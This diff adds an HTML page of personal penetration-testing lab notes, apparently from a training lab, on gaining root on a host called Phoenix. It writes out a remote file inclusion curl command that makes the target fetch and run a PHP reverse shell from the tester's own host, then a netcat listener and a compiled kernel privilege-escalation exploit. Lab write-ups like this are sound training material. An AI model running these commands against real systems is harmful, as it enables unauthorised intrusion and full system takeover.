@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>10.11.1.8 Phoenix</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>10.11.1.8 Phoenix</h1><br/>nmap showed that an assload of ports were open.<br />while enumerating 80 robots.txt pointed me towards /internal.<br />The source code of /internal showed me that the machine was running advanced commenting system.<br />searchsploit showed me that I could craft a curl command to get code execution.<br />curl -s “http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=http://192.168.119.167:443/80.txt%00”<br /><a href=""><img src="images/896-1.png" alt="images/896-1.png" /></a><br />note --I think the trailing %00 makes the file execute as a .php or maybe adds the extension and executes it.<br />80.txt is pentestmonkey&#39;s phpshell.php edited and renamed.<br />catch reverse shell with nc.<br />uname -a shows 2.6.9-89<br />This kernel is vulnerable to 9545 and 9542. 9545 I could not get to work, some kind of job handler thing.<br /><br />on the x86 kali I compiled the exploit and moved it via github<br />gcc -Wall -Wl,--hash-style=both -o 9542 9542.c<br /><br />uploaded with wget, chmoded, executed and popped a root shell in the same termainal.<br /><br />f56a325ef00d4553a4046b7eacc5d667</div></body></html>
